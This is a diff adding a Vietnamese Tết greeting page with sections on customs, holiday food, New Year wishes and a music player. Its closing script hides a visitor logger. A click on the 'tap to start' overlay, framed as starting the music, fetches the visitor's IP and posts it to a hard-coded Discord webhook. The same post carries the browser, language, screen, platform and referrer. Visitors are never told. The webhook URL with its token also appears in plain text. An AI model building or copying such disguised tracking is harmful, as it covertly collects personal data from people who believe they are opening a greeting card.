@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tết Nguyên Đán — Sum Vầy Đón Xuân</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --red: #A32C29;
+    --red-dark: #7A1F1D;
+    --gold: #D9A441;
+    --gold-light: #F0CA7A;
+    --cream: #FBF1DE;
+    --paper: #F6E8CB;
+    --ink: #2B1B12;
+    --green: #2F4A3D;
+  }
+
+  *{ box-sizing:border-box; margin:0; padding:0; }
+  html{ scroll-behavior:smooth; }
+
+  body{
+    font-family:'Be Vietnam Pro', sans-serif;
+    background:var(--cream);
+    color:var(--ink);
+    line-height:1.6;
+    overflow-x:hidden;
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    *{ animation:none !important; transition:none !important; }
+  }
+
+  /* ---------- NAV ---------- */
+  nav{
+    position:fixed; top:0; left:0; right:0; z-index:100;
+    display:flex; align-items:center; justify-content:space-between;
+    padding:20px 6%;
+    background:rgba(251,241,222,0.88);
+    backdrop-filter:blur(6px);
+    border-bottom:1px solid rgba(43,27,18,0.08);
+  }
+  nav .brand{ font-weight:800; font-size:1.15rem; color:var(--red); letter-spacing:0.02em; }
+  nav ul{ list-style:none; display:flex; gap:32px; }
+  nav a{ color:var(--ink); text-decoration:none; font-size:0.95rem; font-weight:500; }
+  nav a:hover{ color:var(--red); }
+  nav ul{ display:none; }
+  @media(min-width:760px){ nav ul{ display:flex; } }
+
+  /* ---------- HERO ---------- */
+  .hero{
+    position:relative;
+    min-height:100vh;
+    background:radial-gradient(ellipse at 50% -10%, var(--red) 0%, var(--red-dark) 65%);
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    text-align:center;
+    color:var(--gold-light);
+    overflow:hidden;
+    padding:120px 6% 80px;
+  }
+
+  .petals{ position:absolute; inset:0; pointer-events:none; }
+  .petal{
+    position:absolute; top:-40px;
+    animation:fall linear infinite;
+    opacity:0.9;
+  }
+  @keyframes fall{
+    0%{ transform:translateY(-5vh) rotate(0deg); }
+    100%{ transform:translateY(110vh) rotate(360deg); }
+  }
+
+  .hero .eyebrow-branch{ width:220px; margin-bottom:28px; opacity:0.95; }
+
+  .hero h1{
+    font-size:clamp(2.6rem, 7vw, 5.2rem);
+    font-weight:800;
+    color:var(--gold-light);
+    text-shadow:0 2px 24px rgba(0,0,0,0.25);
+    line-height:1.05;
+  }
+  .hero .lunar-year{
+    margin-top:18px;
+    font-size:clamp(1.05rem, 2vw, 1.35rem);
+    font-weight:400;
+    font-style:italic;
+    color:#F5DFA6;
+    max-width:560px;
+  }
+  .hero .scroll-cue{
+    margin-top:64px;
+    font-size:0.85rem;
+    letter-spacing:0.08em;
+    color:rgba(240,202,122,0.7);
+  }
+
+  /* ---------- SECTION SHELL ---------- */
+  section{ padding:100px 6%; max-width:1080px; margin:0 auto; }
+  .section-head{ max-width:640px; margin-bottom:56px; }
+  .section-head .tag{ color:var(--red); font-weight:600; font-size:0.95rem; margin-bottom:10px; display:block; }
+  .section-head h2{ font-size:clamp(1.8rem,3.4vw,2.6rem); font-weight:800; color:var(--ink); }
+  .section-head p{ margin-top:14px; color:#5A4534; font-size:1.05rem; max-width:56ch; }
+
+  .divider{ width:100%; height:36px; margin:0 auto; display:block; }
+
+  /* ---------- STORY / INTRO ---------- */
+  .intro{
+    display:grid; grid-template-columns:1fr; gap:40px; align-items:center;
+  }
+  @media(min-width:780px){ .intro{ grid-template-columns:1.1fr 0.9fr; } }
+  .intro p{ font-size:1.08rem; color:#4A3626; }
+  .intro p + p{ margin-top:16px; }
+  .intro .art{ display:flex; justify-content:center; }
+  .intro .art svg{ width:100%; max-width:320px; }
+
+  /* ---------- TRADITIONS ---------- */
+  .tradition-row{
+    display:grid; grid-template-columns:1fr; gap:24px; align-items:center;
+    padding:36px 0; border-top:1px solid rgba(43,27,18,0.1);
+  }
+  .tradition-row:last-child{ border-bottom:1px solid rgba(43,27,18,0.1); }
+  @media(min-width:780px){
+    .tradition-row{ grid-template-columns:120px 1fr; gap:32px; }
+    .tradition-row.reverse{ grid-template-columns:1fr 120px; }
+    .tradition-row.reverse .icon{ order:2; }
+  }
+  .tradition-row .icon{ width:88px; height:88px; }
+  .tradition-row h3{ font-size:1.3rem; font-weight:700; color:var(--red-dark); margin-bottom:8px; }
+  .tradition-row p{ color:#4A3626; max-width:60ch; }
+
+  /* ---------- FOOD ---------- */
+  .food-grid{
+    display:grid; grid-template-columns:1fr; gap:20px;
+  }
+  @media(min-width:640px){ .food-grid{ grid-template-columns:repeat(3,1fr); } }
+  .food-item{
+    background:var(--paper);
+    border:1px solid rgba(43,27,18,0.08);
+    padding:28px 22px;
+    position:relative;
+  }
+  .food-item:nth-child(2){ transform:translateY(18px); }
+  @media(max-width:639px){ .food-item:nth-child(2){ transform:none; } }
+  .food-item .num{ font-size:0.8rem; color:var(--red); font-weight:700; margin-bottom:10px; }
+  .food-item h4{ font-size:1.15rem; font-weight:700; margin-bottom:8px; color:var(--ink); }
+  .food-item p{ font-size:0.95rem; color:#5A4534; }
+
+  /* ---------- WISHES ---------- */
+  .wishes{ background:var(--red); color:var(--gold-light); }
+  .wishes .section-head .tag{ color:var(--gold-light); }
+  .wishes .section-head h2{ color:#fff; }
+  .wishes .section-head p{ color:#F0D7A6; }
+  .wish-list{ display:grid; grid-template-columns:1fr; gap:1px; background:rgba(240,202,122,0.25); border:1px solid rgba(240,202,122,0.25); }
+  @media(min-width:640px){ .wish-list{ grid-template-columns:1fr 1fr; } }
+  .wish-item{ background:var(--red-dark); padding:26px 24px; }
+  .wish-item p{ font-size:1.08rem; font-style:italic; color:#FCEBC2; }
+
+  /* ---------- MUSIC PLAYER ---------- */
+  .music{
+    background:var(--paper);
+    border:1px solid rgba(43,27,18,0.1);
+    padding:40px clamp(20px,4vw,48px);
+    display:flex; flex-direction:column; gap:24px;
+  }
+  @media(min-width:700px){ .music{ flex-direction:row; align-items:center; justify-content:space-between; } }
+  .music-info h3{ font-size:1.3rem; font-weight:700; color:var(--red-dark); margin-bottom:6px; }
+  .music-info p{ color:#5A4534; font-size:0.95rem; max-width:42ch; }
+  audio{ width:100%; max-width:360px; }
+
+  /* ---------- FOOTER ---------- */
+  footer{
+    text-align:center; padding:48px 6% 56px;
+    color:#7A6248; font-size:0.9rem;
+    border-top:1px solid rgba(43,27,18,0.1);
+  }
+  footer .brand{ color:var(--red); font-weight:700; }
+
+  /* ---------- ENTER OVERLAY ---------- */
+  #enter-overlay{
+    position:fixed; inset:0; z-index:1000;
+    background:radial-gradient(ellipse at 50% 40%, var(--red) 0%, var(--red-dark) 70%);
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    text-align:center; cursor:pointer;
+    transition:opacity 0.6s ease, visibility 0.6s ease;
+  }
+  #enter-overlay.hide{ opacity:0; visibility:hidden; pointer-events:none; }
+  #enter-overlay .enter-title{
+    font-size:clamp(1.8rem,5vw,3rem); font-weight:800; color:var(--gold-light);
+    margin-bottom:16px;
+  }
+  #enter-overlay .enter-sub{ color:#F5DFA6; font-size:1rem; margin-bottom:36px; }
+  #enter-overlay .enter-btn{
+    padding:14px 36px; border:1px solid var(--gold-light); border-radius:999px;
+    color:var(--gold-light); font-size:0.95rem; letter-spacing:0.02em;
+    animation:pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse{ 0%,100%{ opacity:1; } 50%{ opacity:0.6; } }
+</style>
+</head>
+<body>
+
+<div id="enter-overlay">
+  <div class="enter-title">🧧 Chạm để đón Tết</div>
+  <div class="enter-sub">Bấm vào bất kỳ đâu để mở nhạc xuân và bắt đầu</div>
+  <div class="enter-btn">Bắt đầu</div>
+</div>
+
+<nav>
+  <div class="brand">Tết &amp; Sum Vầy</div>
+  <ul>
+    <li><a href="#doi-net">Đôi nét</a></li>
+    <li><a href="#phong-tuc">Phong tục</a></li>
+    <li><a href="#mon-an">Món ăn</a></li>
+    <li><a href="#loi-chuc">Lời chúc</a></li>
+    <li><a href="#nhac-xuan">Nhạc xuân</a></li>
+  </ul>
+</nav>
+
+<header class="hero" id="top">
+  <div class="petals" id="petals"></div>
+
+  <svg class="eyebrow-branch" viewBox="0 0 220 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 20 Q55 5 110 20 T220 20" stroke="#F0CA7A" stroke-width="1.5" opacity="0.7"/>
+    <circle cx="60" cy="15" r="5" fill="#F0CA7A"/>
+    <circle cx="110" cy="22" r="4" fill="#F0CA7A"/>
+    <circle cx="160" cy="12" r="5" fill="#F0CA7A"/>
+  </svg>
+
+  <h1>Chúc Mừng<br>Năm Mới</h1>
+  <p class="lunar-year">Một mùa xuân nữa lại về — nơi sắc mai vàng, câu đối đỏ và tiếng cười sum vầy hòa quyện trong từng góc nhà.</p>
+  <div class="scroll-cue">CUỘN XUỐNG ĐỂ XEM THÊM ↓</div>
+</header>
+
+<section id="doi-net">
+  <div class="section-head">
+    <span class="tag">Đôi nét về Tết</span>
+    <h2>Ngày lễ lớn nhất của người Việt</h2>
+  </div>
+  <div class="intro">
+    <div>
+      <p>Tết Nguyên Đán đánh dấu thời khắc chuyển giao giữa năm cũ và năm mới theo lịch âm. Đây không chỉ là một kỳ nghỉ, mà là dịp để mỗi người tạm gác lại bộn bề, trở về bên gia đình, thắp nén hương tưởng nhớ tổ tiên và cùng nhau đón chào những điều tốt lành.</p>
+      <p>Từ phiên chợ Tết rộn ràng, cành đào cành mai khoe sắc, đến nồi bánh chưng đỏ lửa suốt đêm giao thừa — mỗi hình ảnh đều mang theo một phần ký ức tuổi thơ và niềm hy vọng cho một năm mới an lành, sung túc.</p>
+    </div>
+    <div class="art">
+      <svg viewBox="0 0 300 320" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M150 320 C150 240 140 180 130 120" stroke="#7A1F1D" stroke-width="4"/>
+        <path d="M130 200 C110 190 95 195 80 180" stroke="#7A1F1D" stroke-width="3"/>
+        <path d="M140 150 C125 135 105 135 90 120" stroke="#7A1F1D" stroke-width="3"/>
+        <path d="M135 100 C150 85 165 80 175 60" stroke="#7A1F1D" stroke-width="3"/>
+        <g id="mai-flowers">
+          <g transform="translate(80,180)"><circle r="5" fill="#D9A441"/><circle cx="9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="0" cy="-9" r="5" fill="#F0CA7A"/></g>
+          <g transform="translate(90,120) scale(1.2)"><circle r="5" fill="#D9A441"/><circle cx="9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="0" cy="-9" r="5" fill="#F0CA7A"/></g>
+          <g transform="translate(175,60) scale(1.4)"><circle r="5" fill="#D9A441"/><circle cx="9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="0" cy="-9" r="5" fill="#F0CA7A"/></g>
+          <g transform="translate(130,120) scale(0.9)"><circle r="5" fill="#D9A441"/><circle cx="9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-6" cy="8" r="5" fill="#F0CA7A"/><circle cx="-9" cy="-3" r="5" fill="#F0CA7A"/><circle cx="0" cy="-9" r="5" fill="#F0CA7A"/></g>
+        </g>
+      </svg>
+    </div>
+  </div>
+</section>
+
+<section id="phong-tuc">
+  <div class="section-head">
+    <span class="tag">Phong tục</span>
+    <h2>Những điều làm nên không khí Tết</h2>
+    <p>Mỗi vùng miền có cách đón Tết riêng, nhưng vẫn giữ chung những nét đẹp truyền thống được gìn giữ qua bao thế hệ.</p>
+  </div>
+
+  <div class="tradition-row">
+    <svg class="icon" viewBox="0 0 100 100"><rect x="15" y="15" width="70" height="70" fill="#A32C29" opacity="0.1"/><rect x="25" y="25" width="50" height="50" stroke="#A32C29" stroke-width="3" fill="none"/><text x="50" y="58" text-anchor="middle" font-size="22" fill="#A32C29" font-weight="700">福</text></svg>
+    <div>
+      <h3>Lì xì đầu năm</h3>
+      <p>Những phong bao đỏ thắm được trao tay kèm lời chúc sức khỏe, học hành tấn tới hay làm ăn phát đạt — món quà nhỏ nhưng chứa đựng cả tấm lòng của người trao.</p>
+    </div>
+  </div>
+
+  <div class="tradition-row reverse">
+    <svg class="icon" viewBox="0 0 100 100"><circle cx="50" cy="50" r="35" stroke="#D9A441" stroke-width="3" fill="none"/><path d="M50 25 V50 L65 60" stroke="#D9A441" stroke-width="3" stroke-linecap="round"/></svg>
+    <div>
+      <h3>Giao thừa và xông đất</h3>
+      <p>Đúng khoảnh khắc chuyển giao năm cũ sang năm mới, cả gia đình quây quần bên mâm cỗ, đợi người "xông đất" hợp tuổi bước vào nhà đầu tiên để mang lại may mắn cả năm.</p>
+    </div>
+  </div>
+
+  <div class="tradition-row">
+    <svg class="icon" viewBox="0 0 100 100"><path d="M30 70 L30 35 Q50 20 70 35 L70 70 Z" stroke="#2F4A3D" stroke-width="3" fill="none"/><line x1="20" y1="70" x2="80" y2="70" stroke="#2F4A3D" stroke-width="3"/></svg>
+    <div>
+      <h3>Bàn thờ tổ tiên</h3>
+      <p>Mâm ngũ quả, hoa tươi và khói hương trầm lặng trên bàn thờ là lời nhắc nhở con cháu về cội nguồn, về lòng biết ơn đối với ông bà tổ tiên.</p>
+    </div>
+  </div>
+</section>
+
+<section id="mon-an">
+  <div class="section-head">
+    <span class="tag">Ẩm thực</span>
+    <h2>Mâm cỗ ngày Tết</h2>
+    <p>Không khí Tết luôn gắn liền với hương vị quen thuộc, được chuẩn bị công phu suốt nhiều ngày trước Tết.</p>
+  </div>
+  <div class="food-grid">
+    <div class="food-item">
+      <div class="num">01</div>
+      <h4>Bánh chưng, bánh tét</h4>
+      <p>Vuông tròn tượng trưng cho đất trời, gói ghém trong đó là gạo nếp, đậu xanh, thịt mỡ và cả tấm lòng của người gói bánh.</p>
+    </div>
+    <div class="food-item">
+      <div class="num">02</div>
+      <h4>Dưa hành, củ kiệu</h4>
+      <p>Vị chua giòn cân bằng cho mâm cỗ nhiều đạm, là món ăn kèm không thể thiếu bên cạnh bánh chưng ngày Tết.</p>
+    </div>
+    <div class="food-item">
+      <div class="num">03</div>
+      <h4>Mứt Tết, hạt dưa</h4>
+      <p>Khay mứt đủ sắc màu bày trên bàn khách là lời mời gọi ngọt ngào cho những câu chuyện đầu năm.</p>
+    </div>
+  </div>
+</section>
+
+<section id="loi-chuc" class="wishes">
+  <div class="section-head">
+    <span class="tag">Lời chúc</span>
+    <h2>Gửi trao yêu thương đầu năm</h2>
+    <p>Vài lời chúc quen thuộc để gửi đến người thân, bạn bè trong những ngày đầu xuân.</p>
+  </div>
+  <div class="wish-list">
+    <div class="wish-item"><p>"An khang thịnh vượng, vạn sự như ý."</p></div>
+    <div class="wish-item"><p>"Sức khỏe dồi dào, gia đình hạnh phúc."</p></div>
+    <div class="wish-item"><p>"Công việc hanh thông, tài lộc đầy nhà."</p></div>
+    <div class="wish-item"><p>"Năm mới bình an, mọi điều tốt lành."</p></div>
+  </div>
+</section>
+
+<section id="nhac-xuan">
+  <div class="section-head">
+    <span class="tag">Không thể thiếu</span>
+    <h2>Nhạc xuân</h2>
+    <p>Bật một bản nhạc xuân quen thuộc để không khí Tết thêm trọn vẹn khi ghé thăm trang.</p>
+  </div>
+  <div class="music">
+    <div class="music-info">
+      <h3>🎵 Nhạc nền ngày Tết</h3>
+      <p>Thay đường dẫn file nhạc của bạn vào thẻ audio bên dưới.</p>
+    </div>
+    <audio id="bg-music" controls loop>
+      <source src="magnolia.mp3" type="audio/mpeg">
+      Trình duyệt của bạn không hỗ trợ phát nhạc trực tiếp.
+    </audio>
+  </div>
+</section>
+
+<footer>
+  <p><span class="brand">Tết &amp; Sum Vầy</span> — Chúc bạn và gia đình một năm mới an khang, thịnh vượng.</p>
+</footer>
+
+<script>
+  // ========== DISCORD LOG ==========
+  // Thay WEBHOOK_URL bằng link webhook Discord của bạn
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1549328051475841065/UKhoEu1dtz-FwfOjVohZKVgv2CeLLXGsNDxionY4t1DzT7Z5NxJqmzgd7D48tvg3hSZx";
+
+  async function guiLogDiscord() {
+    try {
+      // Lấy IP
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+
+      const userAgent = navigator.userAgent;
+      const language = navigator.language || navigator.userLanguage || "Unknown";
+      const referer = document.referrer || "Trực tiếp / Không có";
+      const time = new Date().toLocaleString("vi-VN");
+      const screenInfo = `${screen.width}x${screen.height}`;
+      const platform = navigator.platform || "Unknown";
+
+      const content = {
+        embeds: [{
+          title: "🔔 Có người mở trang Tết",
+          color: 0xA32C29,
+          fields: [
+            { name: "IP", value: ip, inline: true },
+            { name: "Thời gian", value: time, inline: true },
+            { name: "Ngôn ngữ", value: language, inline: true },
+            { name: "Màn hình", value: screenInfo, inline: true },
+            { name: "Hệ điều hành", value: platform, inline: true },
+            { name: "Referer", value: referer },
+            { name: "User-Agent", value: "```" + userAgent + "```" }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(content)
+      });
+    } catch (err) {
+      console.log("Lỗi gửi log Discord:", err);
+    }
+  }
+
+  // Chạm vào overlay để vào trang + phát nhạc + gửi log
+  (function(){
+    const overlay = document.getElementById('enter-overlay');
+    const music = document.getElementById('bg-music');
+    overlay.addEventListener('click', function(){
+      // Gửi log Discord
+      guiLogDiscord();
+
+      // Phát nhạc
+      music.play().catch(function(){});
+      overlay.classList.add('hide');
+    }, { once:true });
+  })();
+
+  // Falling mai-flower petals
+  (function(){
+    const container = document.getElementById('petals');
+    const count = window.innerWidth < 640 ? 10 : 18;
+    for(let i=0;i<count;i++){
+      const s = document.createElementNS('http://www.w3.org/2000/svg','svg');
+      s.setAttribute('viewBox','0 0 20 20');
+      s.classList.add('petal');
+      const size = 10 + Math.random()*14;
+      s.style.width = size+'px';
+      s.style.height = size+'px';
+      s.style.left = (Math.random()*100)+'%';
+      const duration = 8 + Math.random()*10;
+      const delay = Math.random()*10;
+      s.style.animationDuration = duration+'s';
+      s.style.animationDelay = '-'+delay+'s';
+      s.innerHTML = '<circle cx="10" cy="10" r="9" fill="#F0CA7A" opacity="0.8"/>';
+      container.appendChild(s);
+    }
+  })();
+</script>
+
+</body>
+</html>
